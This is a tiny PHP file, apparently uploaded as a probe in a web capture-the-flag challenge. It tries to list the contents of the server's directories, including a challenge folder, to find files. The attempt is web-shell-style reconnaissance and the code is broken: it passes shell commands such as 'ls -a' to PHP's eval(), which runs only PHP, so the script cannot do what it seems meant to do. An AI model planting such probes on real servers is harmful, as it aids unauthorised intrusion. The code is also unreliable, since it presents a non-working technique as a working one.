<?php
$homepage = eval('ls -a');
echo $homepage;
echo "<br>";
$homepage = eval('ls -a ../');
echo $homepage; echo "<br>";
$homepage = eval('ls -a ../../');
echo $homepage; echo "<br>";
$homepage = eval('ls -a /challenge/web-serveur/ch21/');
echo $homepage;
echo 'alors ?';
?>
